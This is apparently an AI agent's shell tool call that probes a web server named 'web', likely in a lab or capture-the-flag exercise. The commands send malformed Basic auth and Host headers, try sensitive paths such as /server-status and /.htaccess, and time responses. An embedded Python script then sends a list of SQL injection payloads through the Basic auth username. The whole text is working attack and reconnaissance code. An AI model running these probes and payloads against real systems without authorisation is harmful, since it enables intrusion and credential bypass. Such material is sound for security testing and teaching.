arguments.command:
echo "--- empty user:pass"; curl -s -o /dev/null -w "%{http_code}
" -H "Authorization: Basic Og==" http://web/; echo "--- malformed base64"; curl -s -o /dev/null -w "%{http_code}
" -H "Authorization: Basic !!!" http://web/; echo "--- empty header"; curl -s -o /dev/null -w "%{http_code}
" -H "Authorization;" http://web/; echo "--- Bearer"; curl -s -o /dev/null -w "%{http_code}
" -H "Authorization: Bearer abc" http://web/; echo "--- Host: localhost"; curl -s -o /dev/null -w "%{http_code}
" -H "Host: localhost" http://web/; echo "--- Host: evil"; curl -s -o /dev/null -w "%{http_code}
" -H "Host: evil" http://web/; echo "--- POST"; curl -s -o /dev/null -w "%{http_code}
" -X POST http://web/; echo "--- OPTIONS"; curl -s -o /dev/null -w "%{http_code}
" -X OPTIONS http://web/

echo "-- /nonexistent no auth:"; curl -s -o /dev/null -w "%{http_code}
" http://web/nonexistent; echo "-- /nonexistent + Basic:"; curl -s -o /dev/null -w "%{http_code}
" -u a:b http://web/nonexistent; echo "-- /icons/blank.gif + Basic:"; curl -s -o /dev/null -w "%{http_code}
" -u a:b http://web/icons/blank.gif; echo "-- /server-status + Basic:"; curl -s -o /dev/null -w "%{http_code}
" -u a:b http://web/server-status; echo "-- /.htaccess + Basic:"; curl -s -o /dev/null -w "%{http_code}
" -u a:b http://web/.htaccess; echo "-- / + Basic (ctl):"; curl -s -o /dev/null -w "%{http_code}
" -u a:b http://web/

echo "--- timing 401:"; curl -s -o /dev/null -w "%{time_total}\n" http://web/; echo "--- timing 500:"; curl -s -o /dev/null -w "%{time_total}\n" -u a:b http://web/; python3 - <<'EOF'
import base64, urllib.request
payloads = ["' OR '1'='1", "' OR 1=1 -- ", "' OR 1=1--", '" OR 1=1 -- ', "' OR '1'='1' -- ", "' UNION SELECT 'x' -- ", "' UNION SELECT 'x', 'x' -- ", "' UNION SELECT 'x','x','x' -- ", "admin' -- ", "' -- ", "') OR ('1'='1", "1' OR '1'='1", "' OR 1=1 LIMIT 1 -- ", "' || '1'='1", "' OR ''=''", "*' OR '1'='1", "' AND 1=2 UNION SELECT 'a' -- ", "' OR 1=1 #", "'/*", "x' OR 'x'='x' -- ", "admin\" -- ", "' OR password LIKE '%"]
for p in payloads:
    b = base64.b64encode((p+":x").encode()).decode()
    req = urllib.request.Request("http://web/", headers={"Authorization":"Basic "+b})
    try:
        r = urllib.request.urlopen(req, timeout=8)
        print(r.status, repr(p))
    except urllib.error.HTTPError as e:
        if e.code not in (500,):
            print(e.code, repr(p), "<<< INTERESTING")
    except Exception as e:
        print("ERR", repr(p), e)
print("done (silence = all 500)")
EOF
